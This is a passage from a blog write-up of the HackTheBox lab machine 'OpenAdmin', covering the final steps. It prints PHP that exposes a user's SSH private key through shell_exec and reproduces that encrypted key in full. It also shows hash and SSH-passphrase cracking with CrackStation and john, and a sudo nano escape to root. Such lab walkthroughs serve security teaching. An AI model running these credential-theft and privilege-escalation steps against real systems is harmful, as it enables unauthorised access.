+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>[...]
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>      &lt;div class = &#34;container form-signin&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &lt;h2 class=&#34;featurette-heading&#34;&gt;Login Restricted.&lt;span class=&#34;text-muted&#34;&gt;&lt;/span&gt;&lt;/h2&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>          &lt;?php
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>            $msg = &#39;&#39;;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>            if (isset($_POST[&#39;login&#39;]) &amp;&amp; !empty($_POST[&#39;username&#39;]) &amp;&amp; !empty($_POST[&#39;password&#39;])) {
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>              if ($_POST[&#39;username&#39;] == &#39;jimmy&#39; &amp;&amp; hash(&#39;sha512&#39;,$_POST[&#39;password&#39;]) == &#39;00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1&#39;) {
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>                  $_SESSION[&#39;username&#39;] = &#39;jimmy&#39;;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>                  header(&#34;Location: /main.php&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>              } else {
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>                  $msg = &#39;Wrong username or password.&#39;;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>              }
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>            }
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>         ?&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>      &lt;/div&gt; &lt;!-- /container --&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>      &lt;div class = &#34;container&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>         &lt;form class = &#34;form-signin&#34; role = &#34;form&#34;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>            action = &#34;&lt;?php echo htmlspecialchars($_SERVER[&#39;PHP_SELF&#39;]);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>            ?&gt;&#34; method = &#34;post&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>            &lt;h4 class = &#34;form-signin-heading&#34;&gt;&lt;?php echo $msg; ?&gt;&lt;/h4&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>            &lt;input type = &#34;text&#34; class = &#34;form-control&#34;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>               name = &#34;username&#34;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>               required autofocus&gt;&lt;/br&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>            &lt;input type = &#34;password&#34; class = &#34;form-control&#34;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>               name = &#34;password&#34; required&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>            &lt;button class = &#34;btn btn-lg btn-primary btn-block&#34; type = &#34;submit&#34;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>               name = &#34;login&#34;&gt;Login&lt;/button&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>         &lt;/form&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>      &lt;/div&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>   &lt;/body&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/html&gt;
+</span></span></span></code></pre></div><p>Here we find a the sha512 hash for Jimmy&rsquo;s password.</p><p>After a sucessful login, we go to main.php.
+Let&rsquo;s have a look at the source of that page.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> <span style=color:#a6e22e>session_start</span>(); <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span> ($_SESSION[<span style=color:#e6db74>&#39;username&#39;</span>])) { <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: /index.php&#34;</span>); }; 
+</span></span><span style=display:flex><span><span style=color:#75715e># Open Admin Trusted
+</span></span></span><span style=display:flex><span><span style=color:#75715e># OpenAdmin
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$output <span style=color:#f92672>=</span> <span style=color:#a6e22e>shell_exec</span>(<span style=color:#e6db74>&#39;cat /home/joanna/.ssh/id_rsa&#39;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;pre&gt;</span><span style=color:#e6db74>$output</span><span style=color:#e6db74>&lt;/pre&gt;&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;html&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;h3&gt;Don&#39;t forget your &#34;ninja&#34; password&lt;/h3&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Click here to logout &lt;a href=&#34;logout.php&#34; tite = &#34;Logout&#34;&gt;Session
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/html&gt;
+</span></span></span></code></pre></div><p>Looks like this page print the private SSH key of Joanna.
+There&rsquo;s also a hint about a &ldquo;ninja&rdquo; password.</p><p>Notice that the code only checks whether the session has a username variable set.</p><p>Let&rsquo;s check the Apache config and see where the internal site is hosted.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>jimmy@openadmin:~$ ls /etc/apache2/sites-enabled/
+</span></span><span style=display:flex><span>internal.conf  openadmin.conf
+</span></span><span style=display:flex><span>jimmy@openadmin:~$ cat /etc/apache2/sites-enabled/internal.conf
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Listen 127.0.0.1:52846
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;VirtualHost 127.0.0.1:52846&gt;
+</span></span><span style=display:flex><span>    ServerName internal.openadmin.htb
+</span></span><span style=display:flex><span>    DocumentRoot /var/www/internal
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;IfModule mpm_itk_module&gt;
+</span></span><span style=display:flex><span>AssignUserID joanna joanna
+</span></span><span style=display:flex><span>&lt;/IfModule&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    ErrorLog <span style=color:#e6db74>${</span>APACHE_LOG_DIR<span style=color:#e6db74>}</span>/error.log
+</span></span><span style=display:flex><span>    CustomLog <span style=color:#e6db74>${</span>APACHE_LOG_DIR<span style=color:#e6db74>}</span>/access.log combined
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;/VirtualHost&gt;
+</span></span></code></pre></div><p>The internal site is hosted on port 52846 on the localhost interface and has <code>internal.openadmin.htb</code> as hostname.<br>The mod_mpm_itk Apache module causes the Apache process to switch to the domain owner&rsquo;s user identifier (UID) and group identifier (GID) before it responds to the request.
+This allows each user to isolate their files from others with the standard file permission settings.<br>That&rsquo;s how the webpage is able to read Joanna&rsquo;s SSH privkey without having to grant read access to the www-data user.</p><p>Let&rsquo;s use cURL to load the main.php page.<br>Notice how I didn&rsquo;t have to enter a password. I&rsquo;m not 100% certain that this isn&rsquo;t a fluke.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>jimmy@openadmin:~$ curl http://127.0.0.1:52846/main.php
+</span></span><span style=display:flex><span>&lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----
+</span></span><span style=display:flex><span>Proc-Type: 4,ENCRYPTED
+</span></span><span style=display:flex><span>DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+</span></span><span style=display:flex><span>ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+</span></span><span style=display:flex><span>ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
+</span></span><span style=display:flex><span>6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
+</span></span><span style=display:flex><span>ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+</span></span><span style=display:flex><span>y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
+</span></span><span style=display:flex><span>9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
+</span></span><span style=display:flex><span>piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
+</span></span><span style=display:flex><span>/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+</span></span><span style=display:flex><span>40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
+</span></span><span style=display:flex><span>fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
+</span></span><span style=display:flex><span>9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
+</span></span><span style=display:flex><span>X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
+</span></span><span style=display:flex><span>S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
+</span></span><span style=display:flex><span>FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
+</span></span><span style=display:flex><span>Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
+</span></span><span style=display:flex><span>RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
+</span></span><span style=display:flex><span>uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
+</span></span><span style=display:flex><span>1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+</span></span><span style=display:flex><span>XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
+</span></span><span style=display:flex><span>yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+</span></span><span style=display:flex><span>+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+</span></span><span style=display:flex><span>qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
+</span></span><span style=display:flex><span>z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+</span></span><span style=display:flex><span>K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+</span></span><span style=display:flex><span>-----END RSA PRIVATE KEY-----
+</span></span><span style=display:flex><span>&lt;/pre&gt;&lt;html&gt;
+</span></span><span style=display:flex><span>&lt;h3&gt;Don<span style=color:#960050;background-color:#1e0010>&#39;</span>t forget your <span style=color:#e6db74>&#34;ninja&#34;</span> password&lt;/h3&gt;
+</span></span><span style=display:flex><span>Click here to logout &lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;logout.php&#34;</span> tite <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Logout&#34;</span>&gt;Session
+</span></span><span style=display:flex><span>&lt;/html&gt;
+</span></span></code></pre></div><p>I suspect the &lsquo;correct&rsquo; method would be to crack the hash, allowing us to login.<br>We can use the vast collection of rainbow/lookup tables of <a href=https://crackstation.net/ title=CrackStation target=_blank rel=noopener>CrackStation</a> to help us with that.</p><figure class=center><img src=https://sequr.be/img/htb-openadmin-crack.png><figcaption class=center>CrackStation &lsquo;cracked&rsquo; the hash</figcaption></figure><p>We would then pass the password <code>Revealed</code> to the login page, which would result in a valid session and redirect us to main.php</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl -XPOST http://localhost:52846 -d <span style=color:#e6db74>&#34;login&amp;username=jimmy&amp;password=Revealed&#34;</span> -L -v
+</span></span></code></pre></div><p>Copy the SSH key to a local file on the attacker&rsquo;s box and try to SSH as Joanna.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ chmod <span style=color:#ae81ff>600</span> ssh.key
+</span></span><span style=display:flex><span>$ ssh -i ssh.key joanna@10.10.10.171
+</span></span><span style=display:flex><span>Enter passphrase <span style=color:#66d9ef>for</span> key <span style=color:#e6db74>&#39;ssh.txt&#39;</span>:
+</span></span></code></pre></div><p>Let&rsquo;s try to crack the password.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ /usr/share/john/ssh2john.py ssh.key &gt; ssh.key.john
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$ john --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt ssh.key.john 
+</span></span><span style=display:flex><span>Using default input encoding: UTF-8
+</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>SSH <span style=color:#f92672>[</span>RSA/DSA/EC/OPENSSH <span style=color:#f92672>(</span>SSH private keys<span style=color:#f92672>)</span> 32/64<span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>Cost <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>KDF/cipher <span style=color:#f92672>[</span>0<span style=color:#f92672>=</span>MD5/AES 1<span style=color:#f92672>=</span>MD5/3DES 2<span style=color:#f92672>=</span>Bcrypt/AES<span style=color:#f92672>])</span> is <span style=color:#ae81ff>0</span> <span style=color:#66d9ef>for</span> all loaded hashes
+</span></span><span style=display:flex><span>Cost <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>iteration count<span style=color:#f92672>)</span> is <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>for</span> all loaded hashes
+</span></span><span style=display:flex><span>Will run <span style=color:#ae81ff>4</span> OpenMP threads
+</span></span><span style=display:flex><span>Note: This format may emit false positives, so it will keep trying even after
+</span></span><span style=display:flex><span>finding a possible candidate.
+</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
+</span></span><span style=display:flex><span>bloodninjas      <span style=color:#f92672>(</span>ssh.txt<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Warning: Only <span style=color:#ae81ff>2</span> candidates left, minimum <span style=color:#ae81ff>4</span> needed <span style=color:#66d9ef>for</span> performance.
+</span></span><span style=display:flex><span>1g 0:00:00:03 DONE <span style=color:#f92672>(</span>2020-02-13 22:46<span style=color:#f92672>)</span> 0.3115g/s 4467Kp/s 4467Kc/s 4467KC/sa6_123..*7¡Vamos!
+</span></span><span style=display:flex><span>Session completed
+</span></span></code></pre></div><p>So the private key is protected with the password <code>bloodninjas</code>.</p><h3 id=joanna-flag>Joanna (Flag) <a href=#joanna-flag>¶</a></h3><p>Logging in as Joanna, we find the user flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ ssh -i ssh.key joanna@10.10.10.171
+</span></span><span style=display:flex><span>Enter passphrase <span style=color:#66d9ef>for</span> key <span style=color:#e6db74>&#39;ssh.txt&#39;</span>: <span style=color:#75715e># bloodninjas</span>
+</span></span><span style=display:flex><span>Welcome to Ubuntu 18.04.3 LTS <span style=color:#f92672>(</span>GNU/Linux 4.15.0-70-generic x86_64<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>joanna@openadmin:~$ ls
+</span></span><span style=display:flex><span>user.txt
+</span></span><span style=display:flex><span>joanna@openadmin:~$ wc -m user.txt 
+</span></span><span style=display:flex><span><span style=color:#ae81ff>33</span> user.txt
+</span></span></code></pre></div><h2 id=privesc>Privesc <a href=#privesc>¶</a></h2><p>Let&rsquo;s see if this user has any special privileges.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>joanna@openadmin:~$ sudo -l
+</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> joanna on openadmin:
+</span></span><span style=display:flex><span>    env_reset, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>User joanna may run the following commands on openadmin:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>ALL<span style=color:#f92672>)</span> NOPASSWD: /bin/nano /opt/priv
+</span></span></code></pre></div><p>Looks like Joanna can open <code>/opt/priv</code> in nano using sudo, which gives us admin rights.</p><p><a href=https://gtfobins.github.io/gtfobins/nano/#sudo title=GTFObins target=_blank rel=noopener>GTFObins</a> gives us the perfect resource to find paths for privilege escalation.<br>We learn that nano allows us to run commands, using Ctrl+R and Ctrl+X.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>joanna@openadmin:~$ sudo /bin/nano /opt/priv
+</span></span><span style=display:flex><span>^R ^X
+</span></span><span style=display:flex><span>Command to execute: ls /root/
+</span></span><span style=display:flex><span>root.txt
+</span></span><span style=display:flex><span>^R ^X
+</span></span><span style=display:flex><span>Command to execute: cat /root/root.txt
+</span></span><span style=display:flex><span>2f<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span><span style=color:#ae81ff>61</span>
+</span></span></code></pre></div><p>And there we have the root flag :)</p><p>This is definitely a box that shows that enumeration is important and that we might need to pivot a few times to get where we want.</p></div></article><hr><div class=post-info><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg>
+<span rel=tag class="tag p-category"><a href=https://sequr.be/tags/hackthebox.eu/>HackTheBox.eu</a></span>
+<span rel=tag class="tag p-category"><a href=https://sequr.be/tags/dmw0ng/>dmw0ng</a></span>
+<span rel=tag class="tag p-category"><a href=https://sequr.be/tags/machine/>Machine</a></span>
+<span rel=tag class="tag p-category"><a href=https://sequr.be/tags/openadmin/>OpenAdmin</a></span></p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
+<span class=tag><a class=p-category href=https://sequr.be/categories/hack-the-box/>Hack The Box</a></span>
+<span class=tag><a class=p-category href=https://sequr.be/categories/writeup/>Writeup</a></span></p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+1857 Words</p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+<time class=dt-published datetime=2020-05-04T18:53:20+02:00>2020-05-04</time></p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-user"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+<span rel=author class="p-author h-card">DezeStijn</span></p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-link"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<span rel=bookmark class=u-url><a href=https://sequr.be/3172461330>https://sequr.be/3172461330</a></span></p></div><hr><div class=sharing-buttons><a class=resp-sharing-button__link href=https://ko-fi.com/s4squatch target=_blank rel=noopener aria-label title="Buy me a coffee"><div class="resp-sharing-button resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M23.881 8.948c-.773-4.085-4.859-4.593-4.859-4.593H.723c-.604.0-.679.798-.679.798s-.082 7.324-.022 11.822c.164 2.424 2.586 2.672 2.586 2.672s8.267-.023 11.966-.049c2.438-.426 2.683-2.566 2.658-3.734 4.352.24 7.422-2.831 6.649-6.916zm-11.062 3.511c-1.246 1.453-4.011 3.976-4.011 3.976s-.121.119-.31.023c-.076-.057-.108-.09-.108-.09-.443-.441-3.368-3.049-4.034-3.954-.709-.965-1.041-2.7-.091-3.71.951-1.01 3.005-1.086 4.363.407.0.0 1.565-1.782 3.468-.963 1.904.82 1.832 3.011.723 4.311zm6.173.478c-.928.116-1.682.028-1.682.028V7.284h1.77s1.971.551 1.971 2.638c0 1.913-.985 2.667-2.059 3.015z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsequr.be%2fblog%2f2020%2f05%2fopenadmin%2f" target=_blank rel=noopener aria-label title="Share on facebook"><div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fsequr.be%2fblog%2f2020%2f05%2fopenadmin%2f" target=_blank rel=noopener aria-label title="Share on twitter"><div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://reddit.com/submit/?url=https%3a%2f%2fsequr.be%2fblog%2f2020%2f05%2fopenadmin%2f&amp;resubmit=true&amp;title=Openadmin" target=_blank rel=noopener aria-label title="Share on reddit"><div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"/></svg></div></div></a><a class=resp-sharing-button__link href="mailto:?subject=Openadmin&amp;body=https%3a%2f%2fsequr.be%2fblog%2f2020%2f05%2fopenadmin%2f" target=_self rel=noopener aria-label title="Share via email"><div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></div></div></a></div><div class=pagination><div class=pagination__buttons><span class="button previous"><a href=https://sequr.be/blog/2020/05/quickr/><span class=button__icon>←</span>
+<span class=button__text>QuickR</span>
+</a></span><span class="button next"><a href=https://sequr.be/blog/2020/04/sauna/><span class=button__text>Sauna</span>
+<span class=button__icon>→</span></a></span></div></div></main></div><footer class="footer h-card"><div class=footer__inner><div class=footer__content><span>&copy; 2019</span>
+<span><a class="p-name u-url" rel=me href=https://sequr.be/>DezeStijn</a></span>
+<span><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank rel=noopener>CC BY-NC-SA 4.0</a></span>
